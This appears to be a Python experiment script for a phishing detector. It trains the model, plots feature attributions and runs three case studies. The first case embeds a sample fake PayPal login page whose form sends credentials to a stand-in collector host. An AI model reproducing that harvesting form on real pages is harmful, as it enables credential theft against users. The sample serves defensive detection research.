"""
Experiment 3: Explainability Validation and Detailed Case Studies.
Inspects local feature attributions, generates global feature importance rankings,
and evaluates specific diagnostic walkthroughs (True Positive, False Positive Rescue,
and Confident Abstention).
"""

import os
import json
import numpy as np
import pandas as pd
import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt

from beap.config import ALL_FEATURE_COLUMNS
from beap.feature_pipeline import BEAPFeaturePipeline
from beap.models import BEAPLogisticRegression, BEAPXGBoost
from beap.detector import BEAPDetector
from beap.explainer import BEAPExplainer

# Matplotlib styling
plt.rcParams.update({
    "font.size": 11,
    "axes.labelsize": 12,
    "axes.titlesize": 13,
    "legend.fontsize": 10,
    "figure.titlesize": 14
})


def plot_global_feature_importance(importances: dict, out_path: str, top_k: int = 15):
    """Plots top-k global feature importances."""
    sorted_items = list(importances.items())[:top_k]
    features = [item[0].replace("_", " ").title() for item in sorted_items][::-1]
    values = [abs(item[1]) for item in sorted_items][::-1]

    plt.figure(figsize=(9, 6.5))
    bars = plt.barh(features, values, color="#1f77b4", edgecolor="black", alpha=0.85)
    plt.xlabel("Absolute Feature Attribution / Weight Magnitude")
    plt.title(f"Top {top_k} Discriminative Signals (Static vs. Browser Evidence)")
    plt.grid(axis="x", linestyle=":", alpha=0.6)
    plt.tight_layout()
    plt.savefig(out_path, dpi=300)
    plt.close()


def plot_case_study_waterfall(report, out_path: str):
    """Plots waterfall-style feature contribution for a specific case study."""
    signals = []
    # Collect top risks (positive) and top trusts (negative)
    for s in report.top_risk_signals[:4]:
        signals.append((s.feature_name.replace("_", " ").title(), s.attribution_weight, "red"))
    for s in report.top_trust_signals[:4]:
        signals.append((s.feature_name.replace("_", " ").title(), s.attribution_weight, "green"))

    # Sort by attribution value
    signals.sort(key=lambda x: x[1])

    names = [s[0] for s in signals]
    weights = [s[1] for s in signals]
    colors = [s[2] for s in signals]

    plt.figure(figsize=(9, 5))
    plt.axvline(0, color="black", linewidth=1.0, linestyle="--")
    plt.barh(names, weights, color=colors, alpha=0.8, edgecolor="black")
    plt.xlabel("Log-Odds Attribution Contribution (<- Legitimate | Phishing ->)")
    plt.title(f"Evidence Contribution for Case: {report.verdict} (p={report.phishing_probability:.2f})")
    plt.grid(axis="x", linestyle=":", alpha=0.6)
    plt.tight_layout()
    plt.savefig(out_path, dpi=300)
    plt.close()


def main():
    print("=" * 60)
    print("EXPERIMENT 3: EXPLAINABILITY AND CASE STUDY VALIDATION")
    print("=" * 60)

    train_df = pd.read_csv(os.path.join("data", "processed", "train.csv"))
    test_df = pd.read_csv(os.path.join("data", "processed", "test.csv"))

    detector = BEAPDetector(feature_mode="multimodal_full", tau_low=0.35, tau_high=0.65)
    detector.fit(train_df, train_df["label"].values.astype(int))

    # Global importances
    global_imp = detector.classifier.get_global_importances(detector.pipeline.columns)
    os.makedirs(os.path.join("results", "figures"), exist_ok=True)
    plot_global_feature_importance(global_imp, os.path.join("results", "figures", "global_feature_importance.png"))

    case_studies = [
        # Case 1: Sophisticated phishing site disguised as legitimate brand
        {
            "id": "CASE_1_ADVANCED_PHISH",
            "name": "Deceptive Brand Impersonation Phishing",
            "url": "https://auth-verification-paypal-notice.xyz/account/login",
            "html": """
            <html><head><title>PayPal Login Verification</title></head>
            <body><form action="http://malicious-collector-hub.net/steal.php" method="POST">
            <input type="text" name="username" /><input type="password" name="password" />
            <button type="submit">Verify</button></form>
            <!--beap_xss_probe_918273-->
            </body></html>""",
            "headers": {
                "Server": "nginx",
                # Missing HSTS, missing CSP, missing X-Frame-Options
            },
            "tls": {"cert_valid": True, "longevity_days": 45.0, "issuer_name": "Let's Encrypt Authority X3"}
        },
        # Case 2: Benign site that static filters might confuse (has brand name in path or query)
        {
            "id": "CASE_2_BENIGN_RESCUE",
            "name": "Legitimate Platform Rescued by Browser Evidence",
            "url": "https://portal.chase.com/auth/login?verify=true&session=99281",
            "html": """
            <html><head><title>Chase Online Banking</title></head>
            <body><form action="/auth/verify_submit" method="POST">
            <input type="text" name="username" /><input type="password" name="password" />
            <button type="submit">Log In</button></form></body></html>""",
            "headers": {
                "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
                "Content-Security-Policy": "default-src 'self'; form-action 'self'; frame-ancestors 'none';",
                "X-Frame-Options": "DENY",
                "X-Content-Type-Options": "nosniff",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            "tls": {"cert_valid": True, "longevity_days": 365.0, "issuer_name": "DigiCert Global Root CA"}
        },
        # Case 3: Borderline ambiguous page triggering selective abstention
        {
            "id": "CASE_3_BORDERLINE_ABSTAIN",
            "name": "Borderline / Inconclusive Page Triggering Selective Abstention",
            "url": "https://my-unregistered-hobby-site.org/user/portal",
            "html": """
            <html><head><title>Community Portal Login</title></head>
            <body><form action="/login_handler" method="POST">
            <input type="text" name="user" /><input type="password" name="pass" />
            <button type="submit">Sign In</button></form></body></html>""",
            "headers": {
                "X-Content-Type-Options": "nosniff"
                # Missing HSTS, missing CSP, but no cross-domain exfiltration
            },
            "tls": {"cert_valid": True, "longevity_days": 180.0, "issuer_name": "Sectigo RSA Domain Validation"}
        }
    ]

    case_reports = []
    print("\nRunning Detailed Case Study Walkthroughs:\n")

    for case in case_studies:
        pred, rep = detector.inspect_url(
            url=case["url"],
            html_content=case["html"],
            headers=case["headers"],
            tls_info=case["tls"]
        )
        print(f"[{case['id']}] {case['name']}")
        print(f"  URL: {rep.url}")
        print(f"  Verdict: {rep.verdict} (p={rep.phishing_probability:.3f}) | Abstained: {rep.abstained}")
        if rep.abstained:
            print(f"  Abstention Rationale: {rep.abstention_reason}")
        print(f"  Action: {rep.action_recommendation}")
        print("  Top Risk Signals:")
        for s in rep.top_risk_signals[:3]:
            print(f"    - {s.feature_name}: {s.explanation} (attribution = {s.attribution_weight:+.3f})")
        print("  Top Trust Signals:")
        for s in rep.top_trust_signals[:3]:
            print(f"    - {s.feature_name}: {s.explanation} (attribution = {s.attribution_weight:+.3f})")
        print("-" * 50)

        case_reports.append(rep.to_dict())

        # Save plot for Case 1
        if case["id"] == "CASE_1_ADVANCED_PHISH":
            plot_case_study_waterfall(rep, os.path.join("results", "figures", "case_1_waterfall.png"))

    # Save case study summaries to JSON
    with open(os.path.join("results", "case_study_reports.json"), "w") as f:
        json.dump(case_reports, f, indent=2)

    print("\nCase study evaluations completed and saved to results/case_study_reports.json")


if __name__ == "__main__":
    main()

